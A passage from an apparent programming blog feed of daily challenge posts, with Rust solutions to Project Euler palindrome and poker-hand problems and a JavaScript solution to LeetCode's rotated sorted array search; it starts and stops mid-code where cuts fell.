&#123;&#125;", i, tmp, reverse(tmp));</span></span><br><span class="line">            tmp += reverse(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> cnt == <span class="number">50</span> &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">"&#123;&#125;"</span>, i);</span><br><span class="line">            ans += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">is_palindrome</span></span>(n: <span class="built_in">i128</span>) -&gt; <span class="built_in">bool</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> s = n.to_string();</span><br><span class="line">    <span class="comment">// println!("&#123;&#125;",s);</span></span><br><span class="line">    <span class="keyword">let</span> s = s.as_bytes();</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..(s.len()/<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> s[i] != s[s.len()-<span class="number">1</span>-i] &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">reverse</span></span>(<span class="keyword">mut</span> n: <span class="built_in">i128</span>) -&gt; <span class="built_in">i128</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> n!= <span class="number">0</span> &#123;</span><br><span class="line">        ans *= <span class="number">10</span>;</span><br><span class="line">        ans += n%<span class="number">10</span>;</span><br><span class="line">        n /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="81-Search-in-Rotated-Sorted-Array-II"><a href="#81-Search-in-Rotated-Sorted-Array-II" class="headerlink" title="81. Search in Rotated Sorted Array II"></a>81. Search in Rotated Sorted Array II</h3><p>Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand.</p><p>(i.e., <code>[0,0,1,2,2,5,6]</code> might become <code>[2,5,6,0,0,1,2]</code>).</p><p>You are given a target value to search. If found in the array return <code>true</code>, otherwise return <code>false</code>.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [2,5,6,0,0,1,2], target = 0</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [2,5,6,0,0,1,2], target = 3</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure><p><strong>Follow up:</strong></p><ul><li>This is a follow up problem to <a href="https://leetcode.com/problems/search-in-rotated-sorted-array/description/" target="_blank" rel="noopener">Search in Rotated Sorted Array</a>, where <code>nums</code> may contain duplicates.</li><li>Would this affect the run-time complexity? How and why?</li></ul><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; nums</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; target</span></span><br><span class="line"><span class="comment"> * @return &#123;boolean&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> search = <span class="function"><span class="keyword">function</span>(<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (nums[i] === target) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-12 Daily Challenge</title>
      <link href="/2019-02-12-Daily-Challenge/"/>
      <url>/2019-02-12-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Poker hands</em> in <em>Rust</em> and <em>Minimum Moves to Equal Array Elements</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Poker-hands"><a href="#Poker-hands" class="headerlink" title="Poker hands"></a>Poker hands</h3><h3 id="Problem-54"><a href="#Problem-54" class="headerlink" title="Problem 54"></a>Problem 54</h3><p>In the card game poker, a hand consists of five cards and are ranked, from lowest to highest, in the following way:</p><ul><li><strong>High Card</strong>: Highest value card.</li><li><strong>One Pair</strong>: Two cards of the same value.</li><li><strong>Two Pairs</strong>: Two different pairs.</li><li><strong>Three of a Kind</strong>: Three cards of the same value.</li><li><strong>Straight</strong>: All cards are consecutive values.</li><li><strong>Flush</strong>: All cards of the same suit.</li><li><strong>Full House</strong>: Three of a kind and a pair.</li><li><strong>Four of a Kind</strong>: Four cards of the same value.</li><li><strong>Straight Flush</strong>: All cards are consecutive values of same suit.</li><li><strong>Royal Flush</strong>: Ten, Jack, Queen, King, Ace, in same suit.</li></ul><p>The cards are valued in the order:<br>2, 3, 4, 5, 6, 7, 8, 9, 10, Jack, Queen, King, Ace.</p><p>If two players have the same ranked hands then the rank made up of the highest value wins; for example, a pair of eights beats a pair of fives (see example 1 below). But if two ranks tie, for example, both players have a pair of queens, then highest cards in each hand are compared (see example 4 below); if the highest cards tie then the next highest cards are compared, and so on.</p><p>Consider the following five hands dealt to two players:</p><table><thead><tr><th><strong>Hand</strong></th><th><strong>Player 1</strong></th><th><strong>Player 2</strong></th><th><strong>Winner</strong></th></tr></thead><tbody><tr><td><strong>1</strong></td><td>5H 5C 6S 7S KD Pair of Fives</td><td>2C 3S 8S 8D TD Pair of Eights</td><td>Player 2</td></tr><tr><td><strong>2</strong></td><td>5D 8C 9S JS AC Highest card Ace</td><td>2C 5C 7D 8S QH Highest card Queen</td><td>Player 1</td></tr><tr><td><strong>3</strong></td><td>2D 9C AS AH AC Three Aces</td><td>3D 6D 7D TD QD Flush with Diamonds</td><td>Player 2</td></tr><tr><td><strong>4</strong></td><td>4D 6S 9H QH QC Pair of Queens Highest card Nine</td><td>3D 6D 7H QD QS Pair of Queens Highest card Seven</td><td>Player 1</td></tr><tr><td><strong>5</strong></td><td>2H 2D 4C 4D 4S Full House With Three Fours</td><td>3C 3D 3S 9S 9D Full House with Three Threes</td><td>Player 1</td></tr></tbody></table><p>The file, <a href="https://projecteuler.net/project/resources/p054_poker.txt" target="_blank" rel="noopener">poker.txt</a>, contains one-thousand random hands dealt to two players. Each line of the file contains ten cards (separated by a single space): the first five are Player 1&#39;s cards and the last five are Player 2&#39;s cards. You can assume that all hands are valid (no invalid characters or repeated cards), each player&#39;s hand is in no specific order, and in each hand there is a clear winner.</p><p>How many hands does Player 1 win?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Big simulation......</p><p>There must be more graceful implementation, but I&#39;m so poor at Rust...</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> reader = io::stdin();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> line = <span class="built_in">String</span>::new();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> card1: [(<span class="built_in">i32</span>, <span class="built_in">i32</span>); <span class="number">5</span>] = [(<span class="number">0</span>, <span class="number">0</span>); <span class="number">5</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> card2: [(<span class="built_in">i32</span>, <span class="built_in">i32</span>); <span class="number">5</span>] = [(<span class="number">0</span>, <span class="number">0</span>); <span class="number">5</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> rank1: [<span class="built_in">i32</span>; <span class="number">6</span>] = [<span class="number">0</span>; <span class="number">6</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> rank2: [<span class="built_in">i32</span>; <span class="number">6</span>] = [<span class="number">0</span>; <span class="number">6</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// let mut cnt = 0;</span></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="keyword">match</span> reader.read_line(&amp;<span class="keyword">mut</span> line) &#123;</span><br><span class="line">            <span class="literal">Ok</span>(l) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> l == <span class="number">0</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="literal">Err</span>(_) =&gt; <span class="keyword">break</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> iter = line.split_whitespace();</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..<span class="number">5</span> &#123;</span><br><span class="line">            card1[i] = get_card(&amp;iter.next().unwrap());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..<span class="number">5</span> &#123;</span><br><span class="line">            card2[i] = get_card(&amp;iter.next().unwrap());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// print!("&#123;&#125;", line);</span></span><br><span class="line">        <span class="comment">// println!("&#123;:?&#125;", card1);</span></span><br><span class="line">        <span class="comment">// println!("&#123;:?&#125;", card2);</span></span><br><span class="line">        get_rank(&amp;<span class="keyword">mut</span> rank1, &amp;card1);</span><br><span class="line">        get_rank(&amp;<span class="keyword">mut</span> rank2, &amp;card2);</span><br><span class="line">        <span class="comment">// println!("&#123;:?&#125;", rank1);</span></span><br><span class="line">        <span class="comment">// println!("&#123;:?&#125;", rank2);</span></span><br><span class="line">        <span class="keyword">if</span> compare_rank(&amp;rank1, &amp;rank2) &#123;</span><br><span class="line">            <span class="comment">// println!("Test &#123;&#125;: Player 1", cnt);</span></span><br><span class="line">            ans += <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// println!("Test &#123;&#125;: Player 2", cnt);</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// cnt += 1;</span></span><br><span class="line">        <span class="comment">// println!("&#123;&#125;", ans);</span></span><br><span class="line">        line.clear();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">get_card</span></span>(s: &amp;<span class="built_in">str</span>) -&gt; (<span class="built_in">i32</span>, <span class="built_in">i32</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> s = s.chars();</span><br><span class="line">    <span class="keyword">let</span> number = get_number(s.next().unwrap());</span><br><span class="line">    <span class="keyword">let</span> suit = get_suit(s.next().unwrap());</span><br><span class="line">    (number, suit)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">get_number</span></span>(c: <span class="built_in">char</span>) -&gt; <span class="built_in">i32</span> &#123;</span><br><span class="line">    <span class="keyword">match</span> c &#123;</span><br><span class="line">        <span class="string">'2'</span> =&gt; <span class="keyword">return</span> <span class="number">2</span>,</span><br><span class="line">        <span class="string">'3'</span> =&gt; <span class="keyword">return</span> <span class="number">3</span>,</span><br><span class="line">        <span class="string">'4'</span> =&gt; <span class="keyword">return</span> <span class="number">4</span>,</span><br><span class="line">        <span class="string">'5'</span> =&gt; <span class="keyword">return</span> <span class="number">5</span>,</span><br><span class="line">        <span class="string">'6'</span> =&gt; <span class="keyword">return</span> <span class="number">6</span>,</span><br><span class="line">        <span class="string">'7'</span> =&gt; <span class="keyword">return</span> <span class="number">7</span>,</span><br><span class="line">        <span class="string">'8'</span> =&gt; <span class="keyword">return</span> <span class="number">8</span>,</span><br><span class="line">        <span class="string">'9'</span> =&gt; <span class="keyword">return</span> <span class="number">9</span>,</span><br><span class="line">        <span class="string">'T'</span> =&gt; <span class="keyword">return</span> <span class="number">10</span>,</span><br><span class="line">        <span class="string">'J'</span> =&gt; <span class="keyword">return</span> <span class="number">11</span>,</span><br><span class="line">        <span class="string">'Q'</span> =&gt; <span class="keyword">return</span> <span class="number">12</span>,</span><br><span class="line">        <span class="string">'K'</span> =&gt; <span class="keyword">return</span> <span class="number">13</span>,</span><br><span class="line">        <span class="string">'A'</span> =&gt; <span class="keyword">return</span> <span class="number">14</span>,</span><br><span class="line">        _ =&gt; <span class="built_in">panic!</span>(<span class="string">"Unknown value &#123;:?&#125;"</span>, c),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">get_suit</span></span>(c: <span class="built_in">char</span>) -&gt; <span class="built_in">i32</span> &#123;</span><br><span class="line">    <span class="keyword">match</span> c &#123;</span><br><span class="line">        <span class="string">'S'</span> =&gt; <span class="keyword">return</span> <span class="number">0</span>,</span><br><span class="line">        <span class="string">'D'</span> =&gt; <span class="keyword">return</span> <span class="number">1</span>,</span><br><span class="line">        <span class="string">'C'</span> =&gt; <span class="keyword">return</span> <span class="number">2</span>,</span><br><span class="line">        <span class="string">'H'</span> =&gt; <span class="keyword">return</span> <span class="number">3</span>,</span><br><span class="line">        _ =&gt; <span class="built_in">panic!</span>(<span class="string">"Unknown value &#123;:?&#125;"</span>, c),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">get_rank</span></span>(rank: &amp;<span class="keyword">mut</span> [<span class="built_in">i32</span>; <span class="number">6</span>], card: &amp;[(<span class="built_in">i32</span>, <span class="built_in">i32</span>); <span class="number">5</span>]) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> suits: [<span class="built_in">i32</span>; <span class="number">4</span>] = [<span class="number">0</span>; <span class="number">4</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> numbers: [<span class="built_in">i32</span>; <span class="number">15</span>] = [<span class="number">0</span>; <span class="number">15</span>];</span><br><span class="line">    <span class="keyword">for</span> (number, suit) <span class="keyword">in</span> card.iter() &#123;</span><br><span class="line">        suits[*suit <span class="keyword">as</span> <span class="built_in">usize</span>] += <span class="number">1</span>;</span><br><span class="line">        numbers[*number <span class="keyword">as</span> <span class="built_in">usize</span>] += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> suits[<span class="number">0</span>] == <span class="number">5</span> || suits[<span class="number">1</span>] == <span class="number">5</span> || suits[<span class="number">2</span>] == <span class="number">5</span> || suits[<span class="number">3</span>] == <span class="number">5</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> is_ok = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">10</span>..<span class="number">15</span> &#123;</span><br><span class="line">            is_ok = numbers[i] == <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> is_ok &#123;</span><br><span class="line">            rank[<span class="number">0</span>] = <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        is_ok = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">2</span>..<span class="number">10</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> numbers[i] == <span class="number">1</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="number">1</span>..<span class="number">5</span> &#123;</span><br><span class="line">                    is_ok = is_ok &amp;&amp; numbers[i + j] == <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> cnt = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">2</span>..<span class="number">10</span>).rev() &#123;</span><br><span class="line">            <span class="keyword">if</span> numbers[i] == <span class="number">1</span> &#123;</span><br><span class="line">                rank[cnt] = i <span class="keyword">as</span> <span class="built_in">i32</span>;</span><br><span class="line">                cnt += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        rank[<span class="number">0</span>] = <span class="keyword">if</span> is_ok &#123; <span class="number">9</span> &#125; <span class="keyword">else</span> &#123; <span class="number">6</span> &#125;;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">2</span>..<span class="number">15</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> numbers[i] == <span class="number">4</span> &#123;</span><br><span class="line">            rank[<span class="number">0</span>] = <span class="number">8</span>;</span><br><span class="line">            rank[<span class="number">1</span>] = i <span class="keyword">as</span> <span class="built_in">i32</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">2</span>..<span class="number">15</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> numbers[i] == <span class="number">3</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut</span> is_ok = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="number">2</span>..<span class="number">15</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> numbers[j] == <span class="number">2</span> &#123;</span><br><span class="line">                    is_ok = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            rank[<span class="number">0</span>] = <span class="keyword">if</span> is_ok &#123; <span class="number">7</span> &#125; <span class="keyword">else</span> &#123; <span class="number">4</span> &#125;;</span><br><span class="line">            rank[<span class="number">1</span>] = i <span class="keyword">as</span> <span class="built_in">i32</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">2</span>..<span class="number">15</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> numbers[i] == <span class="number">2</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> i + <span class="number">1</span>..<span class="number">15</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> numbers[j] == <span class="number">2</span> &#123;</span><br><span class="line">                    rank[<span class="number">1</span>] = j <span class="keyword">as</span> <span class="built_in">i32</span>;</span><br><span class="line">                    rank[<span class="number">2</span>] = i <span class="keyword">as</span> <span class="built_in">i32</span>;</span><br><span class="line">                    rank[<span class="number">0</span>] = <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="number">2</span>..<span class="number">15</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> numbers[k] == <span class="number">1</span> &#123;</span><br><span class="line">                            rank[<span class="number">3</span>] = k <span class="keyword">as</span> <span class="built_in">i32</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut</span> cnt = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> (<span class="number">2</span>..<span class="number">15</span>).rev() &#123;</span><br><span class="line">                <span class="keyword">if</span> numbers[j] == <span class="number">1</span> &#123;</span><br><span class="line">                    rank[cnt] = j <span class="keyword">as</span> <span class="built_in">i32</span>;</span><br><span class="line">                    cnt += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            rank[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">            rank[<span class="number">1</span>] = i <span class="keyword">as</span> <span class="built_in">i32</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> is_ok = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">2</span>..<span class="number">10</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> numbers[i] == <span class="number">1</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="number">1</span>..<span class="number">5</span> &#123;</span><br><span class="line">                is_ok = is_ok &amp;&amp; numbers[i + j] == <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> is_ok &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    rank[<span class="number">0</span>] = <span class="keyword">if</span> is_ok &#123; <span class="number">5</span> &#125; <span class="keyword">else</span> &#123; <span class="number">1</span> &#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cnt = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">2</span>..<span class="number">15</span>).rev() &#123;</span><br><span class="line">        <span class="keyword">if</span> numbers[i] == <span class="number">1</span> &#123;</span><br><span class="line">            rank[cnt] = i <span class="keyword">as</span> <span class="built_in">i32</span>;</span><br><span class="line">            cnt += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">compare_rank</span></span>(rank1: &amp;[<span class="built_in">i32</span>; <span class="number">6</span>], rank2: &amp;[<span class="built_in">i32</span>; <span class="number">6</span>]) -&gt; <span class="built_in">bool</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> rank1[<span class="number">0</span>] != rank2[<span class="number">0</span>] &#123;</span><br><span class="line">        <span class="keyword">return</span> rank1[<span class="number">0</span>] &gt; rank2[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">match</span> rank1[<span class="number">0</span>] &#123;</span><br><span class="line">        <span class="number">9</span> | <span class="number">8</span> | <span class="number">7</span> | <span class="number">5</span> | <span class="number">4</span> =&gt; <span class="keyword">return</span> rank1[<span class="number">1</span>] &gt; rank2[<span class="number">1</span>],</span><br><span class="line">        _ =&gt; (),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> rank1[<span class="number">0</span>] == <span class="number">6</span> || rank1[<span class="number">0</span>] == <span class="number">1</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> cnt = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> cnt &lt; <span class="number">6</span> &amp;&amp; rank1[cnt] == rank2[cnt] &#123;</span><br><span class="line">            cnt += <span class="number">1</span>;</span><br><span class="line">        